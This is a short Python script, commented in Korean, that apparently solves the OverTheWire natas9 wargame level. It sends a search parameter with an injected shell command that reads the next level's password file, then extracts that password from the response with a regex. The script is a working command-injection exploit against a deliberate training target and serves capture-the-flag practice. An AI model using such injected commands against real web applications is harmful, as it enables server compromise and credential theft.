import requests
import re

url = "http://natas9.natas.labs.overthewire.org"

# natas9 로그인 정보 (natas8을 풀면 얻는 비밀번호)
# 직접 풀어서 본인 값으로 교체하세요
my_pass = "여기에_본인_비밀번호"
auth_cred = ("natas9", my_pass)


input_parm = "; echo ==start==; cat /etc/natas_webpass/natas10; ==end== #"
request_data = {"needle": input_parm, "submit": "Search"}

# 요청
response = requests.get(url, auth=auth_cred, params=request_data)

# 정규표현식 패턴에 해당하는 텍스트 전부 검색
pattern = r"[a-zA-Z0-9]{32}"
matchs = re.findall(pattern, response.text)

# 리스트 컴프리헨션을 이용해 찾은 비밀번호 중 my_pass가 아닌 것만 result 변수에 담아 출력
result = [m for m in matchs if m != my_pass]

if result:
  print(f"다음 레벨 비밀번호 => {result[0]}")
else:
  print("리스트 안에 값 없음. 수동 확인")
  print(response.text)
